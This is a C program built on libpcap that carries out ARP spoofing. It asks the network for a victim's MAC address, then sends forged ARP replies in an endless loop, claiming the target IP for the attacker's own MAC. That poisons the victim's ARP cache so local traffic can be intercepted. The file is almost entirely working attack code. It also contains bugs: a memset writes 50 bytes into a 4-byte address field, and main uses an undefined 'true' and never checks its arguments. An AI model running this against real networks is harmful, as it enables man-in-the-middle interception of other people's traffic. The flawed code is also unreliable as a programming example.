#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include<stdint.h>


void ArpSpoof(const char* if_name, const char* sender_ip_string, const char* target_ip_string, const u_char* packet) {

	struct ifreq ifr;
	size_t if_name_len = strlen(if_name);
	if (if_name_len < sizeof(ifr.ifr_name)) {
		memcpy(ifr.ifr_name, if_name, if_name_len);
		ifr.ifr_name[if_name_len] = 0;
	}
	else {
		fprintf(stderr, "interface name is too long");
		exit(1);
	}



	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd == -1) {
		perror(0);
		exit(1);
	}

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
		perror(0);
		close(fd);
		return;
	}
	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
		fprintf(stderr, "not an Ethernet interface");
		close(fd);
		return; 
	}

	unsigned char* my_mac_addr = (unsigned char*)ifr.ifr_hwaddr.sa_data; 
	struct ether_header header;

	header.ether_type = htons(ETH_P_ARP);
	memcpy(header.ether_shost, my_mac_addr, sizeof(header.ether_shost));
	memcpy(header.ether_dhost, packet + 0x16, sizeof(header.ether_dhost));

	struct ether_arp req;
	req.arp_hrd = htons(ARPHRD_ETHER);
	req.arp_pro = htons(ETH_P_IP);
	req.arp_hln = ETHER_ADDR_LEN;
	req.arp_pln = sizeof(in_addr_t);
	req.arp_op = htons(ARPOP_REPLY);
	memcpy(&req.arp_sha, my_mac_addr, sizeof(req.arp_sha));

	memcpy(&req.arp_spa, packet + 0x1c, 0x04);
	memcpy(&req.arp_tha, packet + 0x16, sizeof(req.arp_tha));

	memset(&req.arp_tpa, inet_addr(target_ip_string), 0x32);


	unsigned char frame[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	memcpy(frame, &header, sizeof(struct ether_header));
	memcpy(frame + sizeof(struct ether_header), &req, sizeof(struct ether_arp));

	char pcap_errbuf[PCAP_ERRBUF_SIZE];
	pcap_errbuf[0] = '\0';
	pcap_t* pcap = pcap_open_live(if_name, 96, 0, 0, pcap_errbuf);
	if (pcap_errbuf[0] != '\0') {
		fprintf(stderr, "%s\n", pcap_errbuf);
	}
	if (!pcap) {
		return; 
	}



	while (1) {
		pcap_sendpacket(pcap, frame, sizeof(frame));
	}
	pcap_close(pcap);

	return;

}

void Send_ArpRequest(const char* if_name, const char* sender_ip_string, const char* target_ip_string) {

	struct ether_header header;
	header.ether_type = htons(ETH_P_ARP);
	memset(header.ether_dhost, 0xff, sizeof(header.ether_dhost));

	struct ether_arp req;
	req.arp_hrd = htons(ARPHRD_ETHER);
	req.arp_pro = htons(ETH_P_IP);
	req.arp_hln = ETHER_ADDR_LEN;
	req.arp_pln = sizeof(in_addr_t);
	req.arp_op = htons(ARPOP_REQUEST);
	memset(&req.arp_tha, 0, sizeof(req.arp_tha));


	struct in_addr sender_ip_addr = { 0 };
	if (!inet_aton(sender_ip_string, &sender_ip_addr)) {
		fprintf(stderr, "%s is not a valid IP address", sender_ip_string);
		exit(1);
	}
	memcpy(&req.arp_tpa, &sender_ip_addr.s_addr, sizeof(req.arp_tpa));


	struct ifreq ifr;
	size_t if_name_len = strlen(if_name);
	if (if_name_len < sizeof(ifr.ifr_name)) {
		memcpy(ifr.ifr_name, if_name, if_name_len);
		ifr.ifr_name[if_name_len] = 0;
	}
	else {
		fprintf(stderr, "interface name is too long");
		exit(1);
	}


	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd == -1) {
		perror(0);
		exit(1);
	}


	if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
		perror(0);
		close(fd);
		exit(1);
	}
	struct sockaddr_in* source_ip_addr = (struct sockaddr_in*) & ifr.ifr_addr;
	memcpy(&req.arp_spa, &source_ip_addr->sin_addr.s_addr, sizeof(req.arp_spa));


	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
		perror(0);
		close(fd);
		exit(1);
	}
	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
		fprintf(stderr, "not an Ethernet interface");
		close(fd);
		exit(1);
	}
	const unsigned char* source_mac_addr = (unsigned char*)ifr.ifr_hwaddr.sa_data;
	memcpy(header.ether_shost, source_mac_addr, sizeof(header.ether_shost));
	memcpy(&req.arp_sha, source_mac_addr, sizeof(req.arp_sha));
	close(fd);


	unsigned char frame[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	memcpy(frame, &header, sizeof(struct ether_header));
	memcpy(frame + sizeof(struct ether_header), &req, sizeof(struct ether_arp));


	char pcap_errbuf[PCAP_ERRBUF_SIZE];
	struct pcap_pkthdr h;
	const u_char* packet;
	pcap_errbuf[0] = '\0';

	pcap_t* pcap = pcap_open_live(if_name, 96, 0, 0, pcap_errbuf);
	if (pcap_errbuf[0] != '\0') {
		fprintf(stderr, "%s\n", pcap_errbuf);
	}
	if (!pcap) {
		exit(1);
	}


	if (pcap_inject(pcap, frame, sizeof(frame)) == -1) {
		pcap_perror(pcap, 0);
		pcap_close(pcap);
		exit(1);
	}
	packet = pcap_next(pcap, &h);
	ArpSpoof(if_name, sender_ip_string, target_ip_string, packet);
	pcap_close(pcap);
}

int main(int argc, const char* argv[])
{

	const char* if_name = argv[1];
	const char* sender_ip_string = argv[2];
	const char* target_ip_string = argv[3];
	char* my_ip_string;
	char* sender_packet[0x3c];
	while (true) {
		Send_ArpRequest(if_name, sender_ip_string, target_ip_string);
	}






	return 0;
}